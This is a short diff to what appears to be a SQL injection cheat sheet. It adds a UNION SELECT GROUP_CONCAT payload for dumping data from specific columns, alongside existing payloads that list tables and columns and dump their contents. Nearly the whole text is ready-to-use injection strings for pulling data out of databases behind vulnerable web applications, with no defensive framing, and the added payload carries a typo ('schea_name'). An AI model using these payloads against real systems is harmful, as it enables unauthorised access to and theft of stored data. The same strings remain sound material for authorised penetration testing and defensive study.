@@ -42,6 +42,10 @@ AND table_name = 'target_table' -- -
 /* --- Dumping data from a column of the listed table --- */
 ' union select group_concat(column_name, "\n") from target_db.target_table-- -
 
+/* --- Dumping data from specific columns --- */
+' UNION SELECT GROUP_CONCAT(column_name1), GROUP_CONCAT(column_name2) 
+FROM schea_name.table_name-- -
+
 
 /* --- Listing Table and Column Pairs --- */
 ' UNION SELECT NULL, GROUP_CONCAT(table_name, ':', column_name, 0x0a) 
